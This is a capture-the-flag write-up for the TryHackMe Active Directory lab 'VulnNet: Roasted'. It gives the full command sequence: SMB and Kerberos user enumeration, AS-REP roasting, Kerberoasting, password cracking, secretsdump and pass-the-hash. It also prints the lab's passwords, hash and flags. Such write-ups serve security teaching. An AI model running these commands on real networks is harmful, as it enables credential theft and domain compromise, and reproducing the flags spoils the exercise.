---
layout: writeup
name: "VulnNet-Roasted"
platform: "TryHackMe"
category: "thm"
difficulty: "Easy"
permalink: /writeups/thm/vulnnet-roasted/
os: "TryHackMe"
date: 2025-11-12
pwned: true
---
# VulnNet: Roasted - TryHackMe

**Platform:** TryHackMe  
**Difficulty:** Easy  
**IP Address:** `10.201.79.171`

![Proof](https://raw.githubusercontent.com/inkedqt/ctf-writeups/main/HTB/proofs/thm_roasted.png)

---

## 🧭 Overview

`VulnNet: Roasted` is an Active Directory-themed Windows machine focused on enumeration, user hunting, AS-REP roasting, Kerberoasting, and privilege escalation through weak scripts. It demonstrates classic Windows network exploitation methodology, ending with full domain compromise.

---

## 🔍 Enumeration

### 🔎 Nmap
```bash
rustscan -a $target --ulimit 5000 -- -sC -sV -Pn -oN nmap_full
```
- High number of open ports (Kerberos, LDAP, SMB, WinRM)
- AD Domain: `vulnnet-rst.local`

### 🔎 SMB Shares
```bash
smbclient -L \\$target\
```
- Two anonymous shares found:
  - `VulnNet-Business-Anonymous`
  - `VulnNet-Enterprise-Anonymous`

Retrieved internal usernames:
```
Alexa Whitehat
Jack Goldenhand
Tony Skid
Johnny Leet
```

---

## 🚪 Exploitation

### 👥 Username Enumeration & AS-REP Roasting
```bash
git clone https://github.com/mohinparamasivam/AD-Username-Generator
python3 username-generate.py -u names.txt -o users.txt
kerbrute userenum users.txt --dc $target -d vulnnet-rst.local
```
**Valid Users:**
- `a-whitehat`
- `j-goldenhand`
- `t-skid`
- `j-leet`

```bash
GetNPUsers -dc-ip $target -usersfile users.txt -outputfile hashes.txt
```
**Found AS-REP hash for:** `t-skid`

### 🔓 Password Cracking
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```
**Password:** `tj072889*`

### ✅ WinRM Access
```bash
crackmapexec winrm $target -u t-skid -p 'tj072889*'  # Fails
```

### 🔥 Kerberoasting
```bash
GetUserSPNs -dc-ip $target 'vulnnet-rst.local/t-skid:tj072889*' -request
```
**Service User:** `enterprise-core-vn`

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt krbhash.txt
```
**Password:** `ry=ibfkfv,s6h,`

### 🦝 Evil-WinRM Shell
```bash
evil-winrm -u enterprise-core-vn -p 'ry=ibfkfv,s6h,' -i $target
```
**User Flag:** `THM{726b7c0baaac1455d05c827b5561f4ed}`

---

## ⬆️ Privilege Escalation

### 📁 SMB Script Disclosure
```bash
smbclient -U 'enterprise-core-vn' \\$target\SYSVOL
get vulnnet-rst.local/scripts/ResetPassword.vbs
```
**Credentials found:**
- User: `a-whitehat`
- Pass: `bNdKVkjv3RR9ht`

### 🧠 Domain Admin Access
```bash
crackmapexec winrm $target -u a-whitehat -p 'bNdKVkjv3RR9ht'  # Pwn3d!
```
```bash
impacket-wmiexec vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@$target
```
Confirmed: `a-whitehat` is a **Domain Admin**.

### 🧂 Dumping Hashes
```bash
impacket-secretsdump -just-dc-ntlm vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@$target
```
- Dumped all domain user hashes
- Administrator hash obtained

### 🛡️ Administrator Shell
```bash
impacket-wmiexec vulnnet-rst.local/Administrator@$target -hashes :c2597747aa5e43022a3a3049a3c3b09d
```
**Root Flag:** `THM{16f45e3934293a57645f8d7bf71d8d4c}`

---

## 🧠 Lessons Learned

- Always check SMB shares for low-hanging usernames.
- Username generators + Kerbrute + AS-REP = reliable foothold.
- Kerberoasting remains effective against misconfigured service accounts.
- SYSVOL is gold for escalation scripts.
- Privilege escalation via password reuse and domain group memberships is common.

---